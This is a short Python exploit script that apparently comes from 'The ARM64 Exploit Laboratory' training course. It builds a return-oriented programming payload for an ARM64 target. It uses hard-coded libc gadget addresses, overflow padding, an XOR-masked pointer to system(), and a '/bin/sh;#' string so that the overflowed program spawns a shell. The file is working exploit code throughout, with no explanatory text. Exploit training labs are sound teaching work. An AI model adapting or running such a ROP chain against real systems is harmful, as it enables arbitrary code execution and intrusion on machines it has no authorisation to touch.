#!/usr/bin/python3
#
# The ARM64 Exploit Laboratory
# by Saumil Shah

import sys, re, os
from helpers import *

##### MAIN #####

libc_base = 0x0000fffff7e56000

##### Gadgets from libc #####

# Gadget to load x1 = address of system
#
# ldr x1, [sp, #0x18]
# mov x0, x1
# ldp x29, x30, [sp], #0x20
# ret

ldr_x1_sp_18_ret = libc_base + 0x00000000000311b8

# Gadget to set x0 = sp + 10 and branch to x1
#
# add x0, sp, #0x10
# eor x1, x1, x2
# blr x1

add_x0_sp_10_blr_x1 = libc_base + 0x00000000000a4564

system = libc_base + 0x43c90


buf = b"A" * 40

rop = b""
rop += p64(ldr_x1_sp_18_ret)
rop += p64(0x4848484848484848)
rop += p64(add_x0_sp_10_blr_x1)
rop += p64(0x5050505050505050)
rop += p64(system ^ 0xfbad2a84)
rop += p64(0x5252525252525252)
rop += p64(0x5353535353535353)

rop += b"/bin/sh;#"

buf = buf + rop

payload = buf + b"\n"

sys.stdout.buffer.write(payload)
